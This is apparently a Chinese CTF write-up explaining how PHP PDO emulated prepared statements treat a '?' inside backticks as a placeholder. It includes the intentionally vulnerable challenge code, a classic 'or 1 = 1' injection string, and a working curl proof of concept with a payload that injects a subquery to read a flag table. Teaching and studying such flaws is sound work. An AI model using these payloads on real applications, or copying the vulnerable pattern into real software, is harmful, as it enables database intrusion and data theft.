---
title: SQL注入：PDO预编译就一定安全了？
pinned: false
description: 看到PDO的源代码就觉得无解？那可未必。
tags: [网络安全]
category: 技术
author: 雪纷飞
draft: false
# updated: 2026-10-10
published: 2026-01-23
image: "./sql.png"
---

# 题目

> 我们以这个题目为例来讲解。本题还是颇有趣味的。

核心逻辑：
```php title="index.php" collapse={12-31}
<?php
error_reporting(0);

$dsn = "mysql:host=127.0.0.1;dbname=ctf;charset=utf8mb4";
$pdo = new PDO($dsn, 'ctfuser', 'ctfpassword');

function sanitize_column($col) {
    return '`' . str_replace('`', '``', $col) . '`';
}

$page = $_GET['page'] ?? 'home';

/* products */
if ($page === 'products') {
    $sort = $_GET['sort'] ?? 'id';
    $name = $_GET['name'] ?? '';
    $safe_sort = sanitize_column($sort);

    if ($name !== '') {
        $sql = "SELECT id, name, price, stock FROM products WHERE name LIKE ? ORDER BY $safe_sort";
        $stmt = $pdo->prepare($sql);
        $stmt->execute(['%' . $name . '%']);
    } else {
        $sql = "SELECT id, name, price, stock FROM products ORDER BY $safe_sort";
        $stmt = $pdo->prepare($sql);
        $stmt->execute();
    }
    $products = $stmt->fetchAll(PDO::FETCH_ASSOC);
}

/* search */
if ($page === 'search' && isset($_GET['col'], $_GET['val'])) {
    $col = $_GET['col'];
    $val = $_GET['val'];
    $safe_col = sanitize_column($col);

    $sql = "SELECT $safe_col FROM products WHERE name = ?";
    $stmt = $pdo->prepare($sql);

    try {
        $stmt->execute([$val]);
    } catch (PDOException $e) {
        if (strpos($e->getMessage(), 'number of bound variables') !== false) {
            $stmt->execute([$val, $val]);
        } else {
            throw $e;
        }
    }
    $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
}
```

SQL表格数据：
```sql title="init.sql" collapse={1-3} collapse={13-23} collapse={30-37}
CREATE DATABASE IF NOT EXISTS ctf;
USE ctf;

CREATE TABLE products (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    price DECIMAL(10,2) NOT NULL,
    stock INT NOT NULL,
    description TEXT
);

INSERT INTO products (name, price, stock, description) VALUES
('Apple', 2.99, 150, 'Fresh red apples from local farms'),
('Banana', 1.49, 200, 'Organic yellow bananas'),
('Orange', 3.49, 120, 'Juicy Valencia oranges'),
('Grape', 4.99, 80, 'Sweet seedless grapes'),
('Mango', 5.99, 60, 'Tropical Alphonso mangoes'),
('Strawberry', 6.49, 45, 'Fresh organic strawberries'),
('Watermelon', 8.99, 30, 'Large seedless watermelons'),
('Pineapple', 4.49, 55, 'Sweet Hawaiian pineapples'),
('Kiwi', 3.99, 90, 'New Zealand green kiwis'),
('Peach', 3.29, 75, 'Georgia peaches');

CREATE TABLE flag (
    id INT AUTO_INCREMENT PRIMARY KEY,
    flag VARCHAR(100) NOT NULL
);

INSERT INTO flag (flag) VALUES ('flag{placeholder}');

CREATE USER IF NOT EXISTS 'ctfuser'@'localhost' IDENTIFIED BY 'ctfpassword';
CREATE USER IF NOT EXISTS 'ctfuser'@'127.0.0.1' IDENTIFIED BY 'ctfpassword';
CREATE USER IF NOT EXISTS 'ctfuser'@'%' IDENTIFIED BY 'ctfpassword';
GRANT SELECT ON ctf.* TO 'ctfuser'@'localhost';
GRANT SELECT ON ctf.* TO 'ctfuser'@'127.0.0.1';
GRANT SELECT ON ctf.* TO 'ctfuser'@'%';
FLUSH PRIVILEGES;
```

:::note
如果有兴趣，不妨通过[Dockerfile][docker-url]亲自构建并体验一下这个题目。
:::

# 分析

## 回顾：传统的SQL注入

假设我们有这样的一个SQL语句：
```php showLineNumbers=false wrap
$sql = "SELECT userid, passwd FROM user WHERE username = '" . $_GET['username'] ."'"
```
这么做合适吗？显然不合适。攻击者只需要传入`anything' or 1 = 1 -- `：
```sql showLineNumbers=false wrap
SELECT userid, passwd FROM user WHERE username = 'anything' or 1 = 1 -- '
```
整个数据库都被拉出来啦！

## PDO预编译

推荐阅读：[浅谈预编译之于SQL注入防御][pdo-sql]。

预编译技术是提前写好了SQL语句的语法结构——或者叫”模板”——所有的用户输入都只是当作参数插入。因此，所有用户输入的内容都只是一个参数，无法逃逸出来，无法对SQL的语法结构、执行逻辑造成任何影响。

### 真实预编译与模拟预编译

其实预编译有两种：真实预编译与模拟预编译。可以通过WireShark抓包来看到他们的区别。

我们来考虑同样的例子：
```sql showLineNumbers=false wrap
SELECT userid, passwd FROM user WHERE username = ?
```

对于模拟预编译，就是客户端用一个函数`sanitize(String) -> String`来处理所有参数，然后把处理后的结果拼接到SQL语句上。WireShark抓包就可以看出，发给服务器的依然是一次到位的SQL。

> 假设用户输入`anything' or 1 = 1 -- `，那么服务器会收到
> ```sql showLineNumbers=false wrap "anything'' or 1 = 1 -- "
> SELECT userid, passwd FROM user WHERE username = 'anything'' or 1 = 1 -- '
> ```
> 可以看到，用户输入的`'`被客户端转义了，服务器会将`anything' or 1 = 1 -- `视为一个整体。

真实预编译有所不同。其会先后向服务端发送两个包，第一个包就是`SELECT userid, passwd FROM user WHERE username = ?`，第二个包则是用户输入的内容。

## 预编译的局限

[浅谈预编译之于SQL注入防御][pdo-sql]已经提到了一些了，不过他们似乎都与本题无关：
- 无法预编译动态表名和列名 _（题目进行了防御）_
- 无法预编译`ORDER BY`
- 无法预编译模糊查询
- 宽字节注入影响预编译

因此，我们这里指出一个新的局限，这个局限是本题破题的关键：
:::IMPORTANT
**PDO预编译会把`?`当占位符——即使它在反引号内。**
:::

> 显然这只有在预编译与直接嵌入SQL混合使用的时候才有效。如果是纯预编译，那还是考虑宽字节吧。

下面就是原题的解答了！赶紧翻上去把题目做出来了再看好不好！

# 解答

构造下面的PoC：
```bash
curl -sG "http://127.0.0.1:8080/" \
  --data-urlencode "page=search" \
  --data-urlencode "col=\\?" \
  --data-urlencode "val=\` FROM (SELECT flag AS \`'\` FROM flag) t -- "
```

:::NOTE
事实上，如果你在浏览器中输入，那么输入框应该是这样的：
```txt showLineNumbers=false wrap
col = \?
val = ` FROM (SELECT flag AS `'` FROM flag) t -- 
```
*上面那么多混乱的`\`全怪bash。*
:::

这么一个PoC交给服务器后，经过php的~~糟蹋~~净化，下面的内容会被进行PDO预编译：
```sql showLineNumbers=false wrap
SELECT `\?` FROM products WHERE name = ?
```

预编译完成了。有两个`?`，因此需要两个参数。**恰好题目会在占位符不匹配的时候重新进行新的SQL查询**：

```php
$sql = "SELECT $safe_col FROM products WHERE name = ?";
$stmt = $pdo->prepare($sql);
try {
    $stmt->execute([$val]);
} catch (PDOException $e) {
    if (strpos($e->getMessage(), 'number of bound variables') !== false) {
        $stmt->execute([$val, $val]);
    } else {
        throw $e;
    }
}
```

上面的PoC最终执行的SQL查询是：
~~~sql showLineNumbers=false wrap "'` FROM (SELECT flag AS `''` FROM flag) t -- '"
SELECT `\'` FROM (SELECT flag AS `''` FROM flag) t -- '` FROM products WHERE name = '` FROM (SELECT flag AS `''` FROM flag) t -- '
~~~
我把`?`替换的部分高亮出来了。如果取消高亮可能看得清楚些：
~~~sql showLineNumbers=false wrap
SELECT `\'` FROM (SELECT flag AS `''` FROM flag) t -- '` FROM products WHERE name = '` FROM (SELECT flag AS `''` FROM flag) t -- '
~~~

另外，推荐阅读：[A Novel Technique for SQL Injection in PDO’s Prepared Statements][slcyber]

<!-- 引用 -->

[docker-url]: https://cloud.tsinghua.edu.cn/f/e2e9795863964d959748/?dl=1 "题目Docker容器"
[pdo-sql]: https://x1lys.github.io/2024/08/13/%E6%B5%85%E8%B0%88%E9%A2%84%E7%BC%96%E8%AF%91%E4%B9%8B%E4%BA%8ESQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/index.html "浅谈预编译之于SQL注入防御"
[slcyber]: https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/ "A Novel Technique for SQL Injection in PDO’s Prepared Statements"